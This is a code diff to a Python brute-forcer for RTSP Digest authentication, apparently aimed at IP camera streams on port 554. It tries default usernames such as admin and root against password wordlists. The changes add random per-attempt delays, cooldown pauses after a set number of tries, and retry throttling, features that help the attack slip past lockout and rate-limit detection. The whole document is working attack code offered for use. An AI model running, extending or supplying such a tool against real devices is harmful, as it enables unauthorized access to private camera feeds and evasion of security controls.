@@ -3,6 +3,7 @@ import hashlib
 import argparse
 import time
 import os
+import random
 
 def send_rtsp_request(ip, port, path, method="OPTIONS", headers=None):
     try:
@@ -66,13 +67,16 @@ def load_wordlist(path, fallback):
     return fallback
 
 def main():
-    parser = argparse.ArgumentParser(description="RTSP Digest Auth Brute-Forcer with Retry and Throttle")
+    parser = argparse.ArgumentParser(description="RTSP Digest Auth Brute-Forcer with Retry, Throttle, Cooldown, Random Delay")
     parser.add_argument("ip", help="Target IP")
     parser.add_argument("path", help="RTSP path (e.g. Streaming/Channels/1)")
     parser.add_argument("-p", "--port", type=int, default=554, help="RTSP port (default: 554)")
     parser.add_argument("-U", "--userlist", help="Path to username wordlist")
     parser.add_argument("-P", "--passlist", help="Path to password wordlist")
     parser.add_argument("-t", "--throttle", type=float, default=0.0, help="Throttle (delay) between attempts in seconds")
+    parser.add_argument("--random", type=float, default=0.0, help="Extra random delay per attempt (0 to n seconds)")
+    parser.add_argument("--cooldown-after", type=int, default=0, help="Cooldown after this many attempts")
+    parser.add_argument("--cooldown-duration", type=int, default=60, help="Cooldown duration in seconds")
     args = parser.parse_args()
 
     usernames = load_wordlist(args.userlist, ["admin", "user", "root"])
@@ -92,6 +96,7 @@ def main():
 
     realm = auth["realm"]
     nonce = auth["nonce"]
+    attempt_counter = 0
 
     print("[*] Starting brute-force...")
 
@@ -99,6 +104,7 @@ def main():
         for password in passwords:
             retry_delay = args.throttle
             retry_attempts = 0
+
             while True:
                 digest = compute_digest(username, password, realm, nonce, "DESCRIBE", uri)
                 auth_header = (
@@ -115,9 +121,8 @@ def main():
                     if "200 OK" in resp:
                         print(f"[+] SUCCESS: {username}:{password}")
                         return
-                    break  # Continue to next password
+                    break
 
-                # If response is empty, retry with increasing delay
                 retry_attempts += 1
                 if retry_attempts == 1:
                     print(f"[!] Empty response, retrying {username}:{password} once...")
@@ -128,6 +133,21 @@ def main():
                     print(f"[!] Max delay reached ({retry_delay:.1f}s). Retrying until success...")
 
                 time.sleep(retry_delay)
+
+            # Cooldown logic
+            attempt_counter += 1
+            if args.cooldown_after and attempt_counter >= args.cooldown_after:
+                print(f"[!] Cooldown triggered. Sleeping {args.cooldown_duration}s after {attempt_counter} attempts.")
+                time.sleep(args.cooldown_duration)
+                attempt_counter = 0
+
+            # Static + random throttle
+            if args.throttle > 0:
+                time.sleep(args.throttle)
+            if args.random > 0:
+                delay = random.uniform(0, args.random)
+                print(f"[*] Random delay: {delay:.3f}s")
+                time.sleep(delay)
 
     print("[-] Brute-force complete. No valid credentials found.")
 
